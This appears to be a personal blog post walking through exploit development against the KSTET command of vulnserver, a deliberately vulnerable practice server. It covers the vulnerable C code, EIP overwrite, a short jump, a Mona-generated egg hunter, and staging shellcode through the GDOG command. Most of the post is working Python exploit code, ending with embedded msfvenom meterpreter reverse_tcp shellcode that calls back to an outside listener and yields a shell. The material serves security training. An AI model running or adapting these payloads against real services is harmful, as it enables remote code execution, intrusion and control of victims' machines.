---
title: "Exploiting vulnserver: kstet"
date: 2019-02-20
description: "Egg Hunter"
summary: "Egg Hunter"
tags: ["vulnserver", "buffer overflow", "exploit dev"]
---

This vulerability is very similar to the one described in the  [TRUN post](/posts/vulnserver/trun.md). However there are some key differences - mainly limitations and restrictions on buffer space.

## The Code

```csharp
if (strncmp(RecvBuf, "KSTET ", 6) == 0) {
    char *KstetBuf = malloc(100);
    strncpy(KstetBuf, RecvBuf, 100);
    memset(RecvBuf, 0, DEFAULT_BUFLEN);
    Function2(KstetBuf);
    SendResult = send( Client, "KSTET SUCCESSFUL\n", 17, 0 );
}

...
void Function2(char *Input) {
	char Buffer2S[60];
	strcpy(Buffer2S, Input);
}
```

The limitations and restrictions are:


- The `KSTET` command will call `Function2` which only allocates __60__ bytes of memory instead of __2000__ as with the `TRUN` command which calls `Function3`.

	__60__ bytes is too small for our reverse shell payload. We will need to insert an egg hunter here that will search for our final shellcode elsewhere in memory.

- `strncpy(KstetBuf, RecvBuf, 100);`
  
	Only the first __100__ bytes of the user supplied input to the `KSTET` command is passed to `Function2`.

With these limitations and restrictions to the buffer space, we cannot simply exploit `KSTET` with a single command. We will need to send our final shellcode payload in a different command and utilize an egg hunter to locate it. An egg hunter is just a small bit of assembly that can search the entire memory range for a magic string we define (just before our final shellcode) and will redirect execution flow there.

## Exploitation

```python
#!/usr/bin/env python

import socket
import sys

buffer = 'A' * 100
command = 'KSTET '
data = command + buffer

print '[*] Sending data: ' + command + buffer.encode('hex')
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

Sending the initial payload:

<img src="/images/vulnserver/kstet/kstet-send-crash1.png" alt="kstet-send-crash1" width="700"/>

We see the same vanilla stack overflow and see the small space we have to work with.

<img src="/images/vulnserver/kstet/kstet-crash1.png" alt="kstet-crash1" width="900"/>

I will skip over the steps to locate `eip` and a `JMP ESP` instruction to take over flow of execution since it was covered in the [TRUN post](/_posts/vulnserver/2019-01-30-trun.md).

```python
#!/usr/bin/env python

import socket
import sys

pre_buf = 'A' * 70
eip = '\xBB\x11\x50\x62'
jmp = '\x90\xEB\xB5' 
post_buf = 'C' * (26 - len(jmp))
buffer = pre_buf + eip + jmp + post_buf
command = 'KSTET '
data = command + buffer

print '[*] Sending data: ' + command + buffer.encode('hex')
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

Looking at the crash after we have control over `eip`, we can see the buffer we have to work with is extremely small. We cannot place the egg hunter code in this small buffer of __C's__.

<img src="/images/vulnserver/kstet/kstet-crash2-limited-space-1.png" alt="kstet-crash2-limited-space-1" width="900"/>

As in the [TRUN post](/_posts/vulnserver/2019-02-07-gmon.md), we can insert a jump short instruction (`EB`) to jump back into our buffer of __A's__.

<img src="/images/vulnserver/kstet/kstet-send-crash5-jmp-short.png" alt="kstet-send-crash5-jmp-short" width="700"/>

Use __Mona__ to generate our egg hunter code with `!mona egghunter -wow64`.

<img src="/images/vulnserver/kstet/mona-generate-egghunter.png" alt="mona-generate-egghunter" width="700"/>

We can also update the exploit to contain our egg hunter payload which will search memory for our unique string (egg). The egg is defined in the egg hunter assembly (`\x77\x30\x30\x74` = `w00t`) and you can change it if you want/need to.

```python
#!/usr/bin/env python

import socket
import sys

nopsled = '\x90' * 4
egghunter = '\x31\xdb\x53\x53\x53\x53\xb3\xc0\x66\x81\xca\xff\x0f\x42\x52\x6a'
egghunter += '\x26\x58\x33\xc9\x8b\xd4\x64\xff\x13\x5e\x5a\x3c\x05\x74\xe9\xb8'
egghunter += '\x77\x30\x30\x74\x8b\xfa\xaf\x75\xe4\xaf\x75\xe1\xff\xe7'
pre_buf = 'A' * (70 - len(egghunter) - len(nopsled))
eip = '\xBB\x11\x50\x62'
jmp = '\x90\xEB\xB5' 
post_buf =  'C' * (26 - len(jmp))
buffer = nopsled + egghunter + pre_buf + eip + jmp + post_buf
command = 'KSTET '
data = command + buffer

print '[*] Sending data: ' + command + buffer.encode('hex')
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

I ran into issues when not giving the egg hunter assembly some space to unpack itself - so suggest adding a small nopsled before the payload.

<img src="/images/vulnserver/kstet/kstet-egghunter-w-nopsled.png" alt="kstet-egghunter-w-nopsled" width="700"/>

If you scroll back to the start of the nopsled for the egg hunter code, you can see some of the nops get eaten / disappear. I do not really understand why this happens - you can see only one nop made it of the 4 I sent. If you know the answer  please ping me on twitter [@dunderhay](https://twitter.com/dunderhay). 

<img src="/images/vulnserver/kstet/kstet-egghunter-unpacked.png" alt="kstet-egghunter-unpacked" width="900"/>

To test the egg hunter, we need to insert the egg into final shellcode code cave. We can use another command that will hold the final shellcode payload in meomry until the egg hunter code comes searching for it. The egg is repeated twice (`w00tw00t`) and inserted just before our final shellcode.

The __GDOG__ command is a perfect candicate as it has a large enough buffer space for our egg and final shellcode payload and has no additional restrictions on the buffer (requiring an ascii only payload etc).

```csharp
if (strncmp(RecvBuf, "GDOG ", 5) == 0) {				
    strncpy(GdogBuf, RecvBuf, 1024);
    SendResult = send( Client, "GDOG RUNNING\n", 13, 0 );
}
```

Insert the egg and final shellcode placeholder payload, it is a good idea to use breakpoint instructions (`CC`) as the exploit will pause in the debugger once the egg is located.

```python
#!/usr/bin/env python

import socket
import sys

egg = 'w00tw00t'
shellcode = '\xCC' * 1000
payload = egg + shellcode
command = 'GDOG '
data = command + payload

print '[*] Sending data: ' + command + egg + shellcode.encode('hex')
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()


nopsled = '\x90' * 4
egghunter = '\x31\xdb\x53\x53\x53\x53\xb3\xc0\x66\x81\xca\xff\x0f\x42\x52\x6a'
egghunter += '\x26\x58\x33\xc9\x8b\xd4\x64\xff\x13\x5e\x5a\x3c\x05\x74\xe9\xb8'
egghunter += '\x77\x30\x30\x74\x8b\xfa\xaf\x75\xe4\xaf\x75\xe1\xff\xe7'
pre_buf = 'A' * (70 - len(egghunter) - len(nopsled))
eip = '\xBB\x11\x50\x62'
jmp = '\x90\xEB\xB5' 
post_buf =  'C' * (26 - len(jmp))
buffer = nopsled + egghunter + pre_buf + eip + jmp + post_buf
command = 'KSTET '
data = command + buffer

print '[*] Sending data: ' + command + buffer.encode('hex')
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

<img src="/images/vulnserver/kstet/kstet-send-egg-and-breakpoints.png" alt="kstet-send-egg-and-breakpoints" width="700"/>

It is really amazing to watch the egg hunter work, you can set a breakpoint before the `JMP EDI` instruction which is the last instruction to execute before jumping to the egg location if found. You can also see that the egg and breakpoints in the debugger shown below.

<img src="/images/vulnserver/kstet/kstet-crash-egg-and-breakpoints.png" alt="kstet-crash-egg-and-breakpoints" width="900"/>

Always test the final shellcode location for bad characters. It is a good habbit and should even be done for the location you use for the egg hunter assembly.

Besides the null terminator (`00`), I found no additional bad characters and updated the exploit with the final payload and as always a little nopsled for it.

```python
#!/usr/bin/env python

import socket
import sys

# msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.185.157 LPORT=4444 -b '\x00' -f python
egg = 'w00tw00t'
shellcode = '\x90' * 32
shellcode += '\xba\x43\xde\x96\x7d\xda\xc0\xd9\x74\x24\xf4\x5b\x31'
shellcode += '\xc9\xb1\x56\x31\x53\x13\x83\xeb\xfc\x03\x53\x4c\x3c'
shellcode += '\x63\x81\xba\x42\x8c\x7a\x3a\x23\x04\x9f\x0b\x63\x72'
shellcode += '\xeb\x3b\x53\xf0\xb9\xb7\x18\x54\x2a\x4c\x6c\x71\x5d'
shellcode += '\xe5\xdb\xa7\x50\xf6\x70\x9b\xf3\x74\x8b\xc8\xd3\x45'
shellcode += '\x44\x1d\x15\x82\xb9\xec\x47\x5b\xb5\x43\x78\xe8\x83'
shellcode += '\x5f\xf3\xa2\x02\xd8\xe0\x72\x24\xc9\xb6\x09\x7f\xc9'
shellcode += '\x39\xde\x0b\x40\x22\x03\x31\x1a\xd9\xf7\xcd\x9d\x0b'
shellcode += '\xc6\x2e\x31\x72\xe7\xdc\x4b\xb2\xcf\x3e\x3e\xca\x2c'
shellcode += '\xc2\x39\x09\x4f\x18\xcf\x8a\xf7\xeb\x77\x77\x06\x3f'
shellcode += '\xe1\xfc\x04\xf4\x65\x5a\x08\x0b\xa9\xd0\x34\x80\x4c'
shellcode += '\x37\xbd\xd2\x6a\x93\xe6\x81\x13\x82\x42\x67\x2b\xd4'
shellcode += '\x2d\xd8\x89\x9e\xc3\x0d\xa0\xfc\x8b\xe2\x89\xfe\x4b'
shellcode += '\x6d\x99\x8d\x79\x32\x31\x1a\x31\xbb\x9f\xdd\x40\xab'
shellcode += '\x1f\x31\xea\xbc\xe1\xb2\x0a\x94\x25\xe6\x5a\x8e\x8c'
shellcode += '\x87\x31\x4e\x30\x52\xaf\x44\xa6\x9d\x87\xe0\xab\x76'
shellcode += '\xd5\x12\xc5\xda\x50\xf4\xb5\xb2\x32\xa9\x75\x63\xf2'
shellcode += '\x19\x1e\x69\xfd\x46\x3e\x92\xd4\xee\xd5\x7d\x80\x47'
shellcode += '\x42\xe7\x89\x1c\xf3\xe8\x04\x59\x33\x62\xac\x9d\xfa'
shellcode += '\x83\xc5\x8d\xeb\xf3\x25\x4e\xec\x91\x25\x24\xe8\x33'
shellcode += '\x72\xd0\xf2\x62\xb4\x7f\x0c\x41\xc7\x78\xf2\x14\xf1'
shellcode += '\xf3\xc5\x82\xbd\x6b\x2a\x43\x3d\x6c\x7c\x09\x3d\x04'
shellcode += '\xd8\x69\x6e\x31\x27\xa4\x03\xea\xb2\x47\x75\x5e\x14'
shellcode += '\x20\x7b\xb9\x52\xef\x84\xec\xe0\xe8\x7a\x72\xcf\x50'
shellcode += '\x12\x8c\x4f\x61\xe2\xe6\x4f\x31\x8a\xfd\x60\xbe\x7a'
shellcode += '\xfd\xaa\x97\x12\x74\x3b\x55\x83\x89\x16\x3b\x1d\x89'
shellcode += '\x95\xe0\xae\xf0\xd6\x17\x4f\x05\xff\x73\x50\x05\xff'
shellcode += '\x85\x6d\xd3\xc6\xf3\xb0\xe7\x7c\x0b\x87\x4a\xd4\x86'
shellcode += '\xe7\xd9\x26\x83'

payload = egg + shellcode
command = 'GDOG '

data = command + payload
print '[*] Sending data: ' + command + egg + shellcode.encode('hex')
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()


nopsled = '\x90' * 4
egghunter = '\x31\xdb\x53\x53\x53\x53\xb3\xc0\x66\x81\xca\xff\x0f\x42\x52\x6a'
egghunter += '\x26\x58\x33\xc9\x8b\xd4\x64\xff\x13\x5e\x5a\x3c\x05\x74\xe9\xb8'
egghunter += '\x77\x30\x30\x74\x8b\xfa\xaf\x75\xe4\xaf\x75\xe1\xff\xe7'
pre_buf = 'A' * (70 - len(egghunter) - len(nopsled))
eip = '\xBB\x11\x50\x62'
jmp = '\x90\xEB\xB5' 
post_buf =  'C' * (26 - len(jmp))
buffer = nopsled + egghunter + pre_buf + eip + jmp + post_buf
command = 'KSTET '
data = command + buffer

print '[*] Sending data: ' + command + buffer.encode('hex')
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

Sending the final exploit.

<img src="/images/vulnserver/kstet/kstet-send-final-exploit.png" alt="kstet-send-final-exploit" width="700"/>

And finally we have a shell!  

<img src="/images/vulnserver/kstet/kstet-final-exploit-1.png" alt="kstet-send-final-exploit-1" width="700"/>